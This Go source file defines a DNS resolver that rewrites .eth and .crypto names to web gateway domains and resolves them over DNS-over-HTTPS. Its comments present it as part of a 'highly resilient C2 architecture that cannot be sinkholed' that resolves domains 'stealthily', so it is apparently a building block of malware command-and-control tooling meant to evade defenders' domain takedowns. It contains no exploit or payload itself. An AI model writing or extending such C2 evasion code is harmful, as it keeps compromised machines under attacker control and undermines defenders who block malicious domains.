package dnsclient

import (
	"context"
	"fmt"
	"strings"

	"github.com/miekg/dns"
)

// Web3Resolver adds support for decentralized domains (.eth)
// It patches Web3 domains out to standard DoH endpoints via Limo/Link gateways.
type Web3Resolver struct {
	Fallback *DoHClient
}

// NewWeb3Resolver creates a new Web3 aware DNS resolver
func NewWeb3Resolver(doh *DoHClient) *Web3Resolver {
	return &Web3Resolver{Fallback: doh}
}

// Resolve intercepts .eth and .crypto to route them through Web3 gateway bridges
// This provides a highly resilient C2 architecture that cannot be sinkholed.
func (w *Web3Resolver) Resolve(ctx context.Context, msg *dns.Msg) (*dns.Msg, error) {
	if len(msg.Question) == 0 {
		return nil, fmt.Errorf("no questions in dns message")
	}

	// Keep purely internal representation clean
	qname := msg.Question[0].Name

	// If it's an ENS (.eth) domain, route via eth.limo bridge
	if strings.HasSuffix(qname, ".eth.") {
		bridgedName := strings.Replace(qname, ".eth.", ".eth.limo.", 1)
		msg.Question[0].Name = bridgedName

		// Use the DoH fallback to resolve the bridged domain stealthily
		if w.Fallback != nil {
			return w.Fallback.LookupGET(ctx, msg)
		}
	}

	// If Unstoppable Domains (.crypto)
	if strings.HasSuffix(qname, ".crypto.") {
		bridgedName := strings.Replace(qname, ".crypto.", ".unstoppable.io.", 1)
		msg.Question[0].Name = bridgedName

		if w.Fallback != nil {
			return w.Fallback.LookupGET(ctx, msg)
		}
	}

	// Default DoH fallback for standard domains
	if w.Fallback != nil {
		return w.Fallback.LookupGET(ctx, msg)
	}

	return nil, fmt.Errorf("no underlying DoH resolver configured")
}
